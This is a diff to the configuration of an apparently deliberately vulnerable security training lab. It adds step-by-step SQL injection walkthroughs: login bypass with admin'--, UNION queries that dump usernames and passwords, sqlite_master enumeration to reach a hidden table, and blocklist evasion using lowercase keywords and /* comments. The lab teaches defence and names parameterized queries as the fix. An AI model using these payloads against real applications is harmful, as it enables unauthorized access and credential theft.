@@ -233,11 +233,68 @@
       high: "Every query is a prepared statement with bound parameters. Errors are generic. Your payloads are treated as plain data."
     },
     hints: [
-      '<details class="hint"><summary>Hint: authentication bypass</summary><div><p>The login query compares <code>username = \'…\'</code>. Close the quote and comment out the rest of the statement, e.g. <code>admin\'--</code>.</p></div></details>',
-      '<details class="hint"><summary>Hint: UNION-based extraction</summary><div><p>The search query returns 4 columns. A UNION must return the same number: <code>\' UNION SELECT id, username, password, role FROM users--</code></p></div></details>',
-      '<details class="hint"><summary>Hint: finding the hidden table</summary><div><p>SQLite stores its schema in <code>sqlite_master</code>. Try <code>\' UNION SELECT 1, name, sql, 4 FROM sqlite_master--</code>, then query the table you find.</p></div></details>',
-      '<details class="hint"><summary>Hint: bypassing the blocklist</summary><div><p>The filter is case-sensitive and SQLite keywords are not. Use lowercase keywords and replace <code>--</code> with an unterminated <code>/*</code> comment.</p></div></details>'
-    ].join("")
+      {
+        objective: "sqli-login",
+        title: "Log in as admin without the password",
+        level: "low",
+        nudge: "The login form puts your username inside quotes in the SQL query: <code>WHERE username = '…'</code>. What happens if your username contains a quote of its own?",
+        steps: [{ code: "Username: admin'--\nPassword: anything", fill: { "#login-user": "admin'--", "#login-pass": "anything" }, send: "#login-form button" }],
+        parts: [
+          ["admin", "The account you want to sign in as."],
+          ["'", "Closes the username string early. Everything after it is read as SQL, not as data."],
+          ["--", "Starts a SQL comment, so the database ignores the rest of the query, including the password check."]
+        ],
+        why: "The query becomes <code>WHERE username = 'admin'--' AND password = '…'</code>. Everything after <code>--</code> is a comment, so the only condition left is <code>username = 'admin'</code>. Watch the Query inspector to see the exact statement."
+      },
+      {
+        objective: "sqli-union",
+        title: "Dump usernames and passwords with UNION",
+        level: "low",
+        nudge: "The search returns four columns (id, name, category, price). <code>UNION</code> joins the rows of a second <code>SELECT</code> onto the first, as long as it also returns four columns.",
+        steps: [{ code: "' UNION SELECT id, username, password, role FROM users--", fill: { "#search-q": "' UNION SELECT id, username, password, role FROM users--" }, send: "#search-form button" }],
+        parts: [
+          ["'", "Closes the search string."],
+          ["UNION SELECT", "Adds the results of a second query to the first."],
+          ["id, username, password, role", "Four columns, to match the four the search already returns."],
+          ["FROM users", "The table that holds the accounts."],
+          ["--", "Comments out the leftover <code>%'</code> at the end of the original query."]
+        ],
+        why: "The database doesn't care that products and users have nothing in common. A UNION only needs the same number of columns. The usernames and passwords appear in the results table as if they were products."
+      },
+      {
+        objective: "sqli-flag",
+        title: "Find the hidden table",
+        level: "low",
+        nudge: "There's a table nobody told you about. SQLite keeps a list of every table, and the SQL that created it, in a built-in table called <code>sqlite_master</code>.",
+        steps: [
+          { label: "Step 1: list every table and its columns", code: "' UNION SELECT 1, name, sql, 4 FROM sqlite_master--", fill: { "#search-q": "' UNION SELECT 1, name, sql, 4 FROM sqlite_master--" }, send: "#search-form button" },
+          { label: "Step 2: read the table you found", code: "' UNION SELECT id, note, value, 4 FROM internal_secrets--", fill: { "#search-q": "' UNION SELECT id, note, value, 4 FROM internal_secrets--" }, send: "#search-form button" }
+        ],
+        parts: [
+          ["1, …, 4", "Placeholder numbers that pad the result to four columns."],
+          ["name", "The name of each table."],
+          ["sql", "The <code>CREATE TABLE</code> statement, which lists the table's column names."],
+          ["internal_secrets", "The hidden table that step 1 reveals."]
+        ],
+        why: "Attackers rarely know the schema in advance, but databases describe themselves: <code>sqlite_master</code> in SQLite, <code>information_schema</code> in MySQL and PostgreSQL. Once you know the table and column names, you can select from them."
+      },
+      {
+        objective: "sqli-medium",
+        title: "Get past the keyword blocklist",
+        level: "medium",
+        nudge: "Medium deletes <code>OR</code>, <code>UNION</code>, <code>SELECT</code> and <code>--</code> from your input, but only in uppercase. SQL keywords work in any case, and <code>--</code> isn't the only way to write a comment.",
+        steps: [
+          { label: "Log in as admin", code: "Username: admin'/*\nPassword: anything", fill: { "#login-user": "admin'/*", "#login-pass": "anything" }, send: "#login-form button" },
+          { label: "Or dump the users with lowercase keywords", code: "' union select id, username, password, role from users/*", fill: { "#search-q": "' union select id, username, password, role from users/*" }, send: "#search-form button" }
+        ],
+        parts: [
+          ["'", "Closes the string, as before."],
+          ["/*", "Starts a block comment. SQLite lets an unclosed one run to the end of the query, so it does the job of <code>--</code>."],
+          ["union select", "Lowercase keywords the case-sensitive filter doesn't match."]
+        ],
+        why: "Blocklists fail because an attacker only needs one input the list forgot. The real fix is a parameterized query. Switch to High and try the same payloads."
+      }
+    ],
   });
 
   loadEngine();
